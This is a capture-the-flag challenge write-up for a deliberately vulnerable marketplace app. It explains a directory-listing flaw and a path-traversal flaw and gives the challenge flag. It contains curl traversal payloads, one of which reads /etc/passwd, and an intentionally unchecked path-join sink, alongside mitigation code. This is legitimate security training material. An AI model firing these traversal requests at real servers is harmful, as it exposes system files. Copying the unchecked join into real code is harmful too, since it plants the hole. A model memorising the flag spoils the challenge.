# CTF Challenge: Vendor Directory Listing + Path Traversal

**Category:** Web / Directory Listing / Path Traversal  
**Difficulty:** Easy–Medium  
**Flag:** `CTF{v3nd0r_d1r_l1st1ng_tr4v3rs4l}`

---

## Description

LoopyMart exposes a public `/vendor` endpoint that serves a live listing of registered
marketplace vendors.  Each vendor is represented as a **folder** under `/tmp/vendor_data/`.
Two intentional weaknesses co-exist:

1. **Directory listing is enabled (CWE-548)** — `GET /vendor` returns a real filesystem listing
   of every vendor folder (backed by `os.scandir`), including a normal-looking internal entry
   `internal-ops/` that should never be publicly browsable.  Browsing into it reveals a
   `flag.txt` that holds the CTF flag.

2. **Path traversal (CWE-22)** — `GET /vendor/{path}` joins the caller-supplied path to the
   vendor data directory with Python’s `/` operator and no `resolve()` / `is_relative_to()`
   check.  `../` sequences freely escape the vendor data root.

---

## Vulnerability

| | |
|---|---|
| **Endpoint A** | `GET /vendor` |
| **Endpoint B** | `GET /vendor/{path}` |
| **Vulnerable File** | `backend/app/api/vendor.py` |
| **Vulnerable Sink** | `target = _VENDOR_DATA_DIR / clean` — no `Path.resolve()` or `is_relative_to()` |
| **CWE-548** | Information Exposure Through Directory Listing |
| **CWE-22** | Improper Limitation of a Pathname to a Restricted Directory |

```python
# vendor.py  (intentional sink)
clean  = vendor_path.strip("/")
target = _VENDOR_DATA_DIR / clean    # ← no boundary check
```

---

## Exploitation

### Exploit A — Directory Listing Recon (no traversal needed)

```bash
# Step 1: browse the top-level vendor listing
curl http://localhost:8001/vendor
# → HTML index — spot "internal-ops/" among the vendor folders

# Step 2: browse into the flag vendor folder
curl http://localhost:8001/vendor/internal-ops/
# → HTML index — shows flag.txt inside

# Step 3: read the flag
curl http://localhost:8001/vendor/internal-ops/flag.txt
# CTF{v3nd0r_d1r_l1st1ng_tr4v3rs4l}
```

### Exploit B — Classic Path Traversal

The flag is also written to `/tmp/vendor_traversal_flag.txt` on startup.
`_VENDOR_DATA_DIR` is `/tmp/vendor_data/`, so one `../` step reaches `/tmp/`.

```bash
curl "http://localhost:8001/vendor/../vendor_traversal_flag.txt"
# CTF{v3nd0r_d1r_l1st1ng_tr4v3rs4l}

# Deeper traversal
curl "http://localhost:8001/vendor/../../etc/passwd"
```

### Automated

```bash
python solutions/vendor-traversal/solve.py --url http://localhost:8001
```

The script tries Exploit A first (fastest), then falls back to Exploit B automatically.

---

## Mitigation

- **Disable directory listing** — never expose raw filesystem enumeration to unauthenticated callers.  Maintain an explicit allow-list of public vendor slugs instead.
- **Canonicalise and validate the path** before serving:
  ```python
  resolved = (_VENDOR_DATA_DIR / vendor_path).resolve()
  if not resolved.is_relative_to(_VENDOR_DATA_DIR.resolve()):
      raise HTTPException(status_code=400, detail="Invalid path")
  ```
- Serve vendor metadata from a database, not raw filesystem reads.

---

## Flag

```
CTF{v3nd0r_d1r_l1st1ng_tr4v3rs4l}
```
